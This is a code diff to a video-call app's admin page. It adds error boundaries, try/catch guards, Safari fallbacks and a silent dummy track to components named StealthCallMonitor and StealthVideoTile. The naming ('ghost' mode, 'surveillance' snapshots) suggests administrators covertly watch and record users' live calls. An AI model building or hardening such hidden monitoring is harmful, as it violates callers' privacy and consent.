@@ -10,6 +10,7 @@ import {
 } from 'lucide-react';
 import { serverUrl, getSocket } from '@/lib/socket';
 import BrandLogo from '@/components/BrandLogo';
+import CallErrorBoundary from '@/components/CallErrorBoundary';
 
 const fmt = (s) => {
   s = Math.max(0, Math.floor(s || 0));
@@ -45,23 +46,37 @@ function StealthVideoTile({ stream, user, listenAudio }) {
 
   useEffect(() => {
     if (!videoRef.current) return;
-    if (stream) {
-      videoRef.current.srcObject = stream;
-      const vTracks = stream.getVideoTracks();
-      setHasVideo(vTracks.length > 0 && vTracks.some((t) => t.enabled));
-      videoRef.current.play().catch(() => {});
-    } else {
-      videoRef.current.srcObject = null;
+    try {
+      if (stream && typeof stream.getVideoTracks === 'function') {
+        videoRef.current.srcObject = stream;
+        const vTracks = stream.getVideoTracks() || [];
+        setHasVideo(vTracks.length > 0 && vTracks.some((t) => t.enabled));
+        videoRef.current.play().catch(() => {});
+      } else {
+        videoRef.current.srcObject = null;
+        setHasVideo(false);
+      }
+    } catch (e) {
+      console.warn('StealthVideoTile video error:', e);
+      try { videoRef.current.srcObject = null; } catch {}
       setHasVideo(false);
     }
   }, [stream]);
 
   useEffect(() => {
-    if (!audioRef.current || !stream) return;
-    audioRef.current.srcObject = stream;
-    audioRef.current.muted = !effectiveAudio;
-    if (effectiveAudio) {
-      audioRef.current.play().catch(() => {});
+    if (!audioRef.current) return;
+    try {
+      if (stream) {
+        audioRef.current.srcObject = stream;
+        audioRef.current.muted = !effectiveAudio;
+        if (effectiveAudio) {
+          audioRef.current.play().catch(() => {});
+        }
+      } else {
+        audioRef.current.srcObject = null;
+      }
+    } catch (e) {
+      console.warn('StealthVideoTile audio error:', e);
     }
   }, [stream, effectiveAudio]);
 
@@ -72,6 +87,8 @@ function StealthVideoTile({ stream, user, listenAudio }) {
         videoRef.current.requestFullscreen();
       } else if (videoRef.current.webkitRequestFullscreen) {
         videoRef.current.webkitRequestFullscreen();
+      } else if (videoRef.current.webkitEnterFullscreen) {
+        videoRef.current.webkitEnterFullscreen();
       }
     } catch {}
   };
@@ -84,14 +101,17 @@ function StealthVideoTile({ stream, user, listenAudio }) {
       canvas.width = videoRef.current.videoWidth || 640;
       canvas.height = videoRef.current.videoHeight || 480;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-      const url = canvas.toDataURL('image/png');
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `surveillance-${(user?.name || 'caller').replace(/\s+/g, '_')}-${Date.now()}.png`;
-      a.click();
+      if (ctx) {
+        ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+        const url = canvas.toDataURL('image/png');
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `surveillance-${(user?.name || 'caller').replace(/\s+/g, '_')}-${Date.now()}.png`;
+        a.click();
+      }
       setTimeout(() => setSnapshotTaken(false), 800);
-    } catch {
+    } catch (e) {
+      console.warn('Snapshot error:', e);
       setSnapshotTaken(false);
     }
   };
@@ -216,10 +236,26 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = false })
         ctx.fillStyle = '#070512';
         ctx.fillRect(0, 0, 320, 240);
       }
-      return canvas.captureStream ? canvas.captureStream(5) : null;
-    } catch {
-      return null;
-    }
+      const stream = canvas.captureStream ? canvas.captureStream(5) : (canvas.webkitCaptureStream ? canvas.webkitCaptureStream(5) : null);
+      if (stream && stream.getVideoTracks().length > 0) return stream;
+    } catch {}
+    // If canvas stream is unavailable (e.g. mobile Safari), create dummy silent track to prevent empty-stream PeerJS errors
+    try {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (AudioCtx) {
+        const actx = new AudioCtx();
+        const osc = actx.createOscillator();
+        const dst = actx.createMediaStreamDestination();
+        osc.connect(dst);
+        osc.start();
+        const trk = dst.stream.getAudioTracks()[0];
+        if (trk) {
+          trk.enabled = false;
+          return new MediaStream([trk]);
+        }
+      }
+    } catch {}
+    return new MediaStream();
   };
 
   useEffect(() => {
@@ -1276,7 +1312,9 @@ export default function AdminPage() {
                       {/* Inline Live Video Call Monitor */}
                       {expandedCallRooms[room.roomId] && (
                         <div className="animate-in fade-in duration-200">
-                          <StealthCallMonitor roomId={room.roomId} users={room.users || []} />
+                          <CallErrorBoundary title="Video Surveillance Stream" resetLabel="Reconnect Feeds">
+                            <StealthCallMonitor roomId={room.roomId} users={room.users || []} />
+                          </CallErrorBoundary>
                         </div>
                       )}
 
@@ -1644,11 +1682,13 @@ export default function AdminPage() {
                       </div>
 
                       {/* Embedded Live Video Call Feeds */}
-                      <StealthCallMonitor
-                        roomId={room.roomId}
-                        users={roomUsers}
-                        externalListenAudio={globalListenAudio}
-                      />
+                      <CallErrorBoundary title="Video Surveillance Stream" resetLabel="Reconnect Feeds">
+                        <StealthCallMonitor
+                          roomId={room.roomId}
+                          users={roomUsers}
+                          externalListenAudio={globalListenAudio}
+                        />
+                      </CallErrorBoundary>
                     </div>
                   );
                 })}
@@ -2196,7 +2236,9 @@ export default function AdminPage() {
             </div>
 
             {/* 🎥 Live Stealth Video Call Monitor */}
-            <StealthCallMonitor roomId={ghostModal.roomId} users={ghostSyncState?.users || []} />
+            <CallErrorBoundary title="Stealth Video Feed" resetLabel="Reconnect Feeds">
+              <StealthCallMonitor roomId={ghostModal.roomId} users={ghostSyncState?.users || []} />
+            </CallErrorBoundary>
           </div>
         </div>
       )}
